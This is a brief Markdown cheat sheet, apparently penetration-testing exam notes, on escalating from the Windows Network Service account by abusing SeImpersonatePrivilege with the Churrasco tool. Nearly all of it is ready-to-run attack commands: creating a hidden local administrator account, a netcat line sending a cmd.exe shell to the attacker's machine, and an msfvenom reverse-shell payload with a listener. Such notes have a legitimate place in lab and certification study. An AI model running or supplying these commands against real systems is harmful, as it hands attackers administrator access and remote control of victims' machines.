#### Privilage escalation for *nt authority\network service*
Network Service account is a special built-in account that has reduced privileges similar to an authenticated user account. This limited access helps safeguard the computer if an attacker compromises individual services or processes.


```
c:> whoami
whoami
nt authority\network service
```
#### Check /priv
```
c:> whoami /priv
whoami /priv

check for SeImpersonatePrivilage is Enabled
```

#### Upload *churrasco.exe*
- https://github.com/Re4son/Churrasco

#### Create user *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

#### Create connection *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```

#### Create reverse shell
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip_address> lport=<your_port> -f exe -o revshell.exe
upload revshell.exe to machine

churrasco.exe -d "C:\revshell\exe\path\"

in your machine nc -lnvp xyz
```
